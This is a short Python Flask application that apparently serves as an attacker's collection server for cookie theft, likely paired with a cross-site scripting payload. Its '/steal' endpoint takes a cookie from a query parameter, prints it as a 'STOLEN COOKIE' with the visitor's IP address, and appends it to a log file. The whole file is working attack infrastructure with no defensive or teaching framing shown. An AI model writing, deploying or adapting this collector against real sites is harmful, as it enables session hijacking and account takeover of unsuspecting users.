from flask import Flask, request, render_template
import datetime

app = Flask(__name__)


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/steal")
def steal():
    cookie = request.args.get("c", "none")
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    print(f"\n{'='*50}")
    print(f"[{timestamp}] STOLEN COOKIE: {cookie}")
    print(f"From IP: {request.remote_addr}")
    print(f"{'='*50}\n")

    with open("stolen_cookies.log", "a") as f:
        f.write(f"[{timestamp}] {cookie}\n")

    return "", 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
